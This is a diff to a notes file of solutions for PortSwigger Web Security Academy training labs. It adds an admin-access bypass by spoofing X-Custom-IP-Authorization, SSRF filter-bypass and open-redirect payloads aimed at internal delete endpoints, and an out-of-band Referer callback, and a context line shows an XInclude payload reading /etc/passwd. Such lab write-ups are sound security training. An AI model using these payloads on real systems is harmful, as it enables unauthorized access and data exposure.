@@ -1069,6 +1069,18 @@ curl -s -k -L https://ac571f011f468d17c0f420a700fa0031.web-security-academy.net/
 
     https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass
 
+Solution:
+
+```
+TRACE /admin
+
+# Notice X-Custom-IP-Authorization header in the response
+
+GET /admin/delete?username=carlos
+...
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
 ## HTTP Host header attacks
 
 ### Lab: Basic password reset poisoning
@@ -1303,6 +1315,38 @@ Do not rely solely on `Host` header as an authentication factor, in addition imp
     curl -s --cookie 'session=5N9l2T48cjM2v8hcBUt3nXR7rbIn0s4C' -k -x 127.0.0.1:8080 -L https://acf61f111effb787c06c89ab00fb00f1.web-security-academy.net/product/stock -d "stockApi=http://192.168.0.242:8080/admin/delete?username=carlos"
 
 **Mitigation**
+
+### Lab: SSRF with blacklist-based input filter
+
+    https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
+
+Payload:
+
+    LoCaLhOSt/aDmIn/delete?username=carlos 
+
+### Lab: SSRF with filter bypass via open redirection vulnerability
+
+    https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
+
+Solution: taking advantage of open-redirect in the app.
+
+    stockApi=/product/nextProduct%3fcurrentProductId%3d19%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
+
+### Lab: Blind SSRF with out-of-band detection
+
+    https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection
+
+Solution: manipulation of Referer header.
+
+    Referer: https://cfvmob36g2wyztoyn5de47ajxa31rrfg.oastify.com
+
+### Lab: SSRF with whitelist-based input filter
+
+    https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
+
+### Lab: Blind SSRF with Shellshock exploitation
+
+    https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation
 
 ## CORS
 
@@ -1582,4 +1626,8 @@ Connection: close
 productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=2
 ```
 
+## Race conditions
 
+### Lab: Limit overrun race conditions
+
+    https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
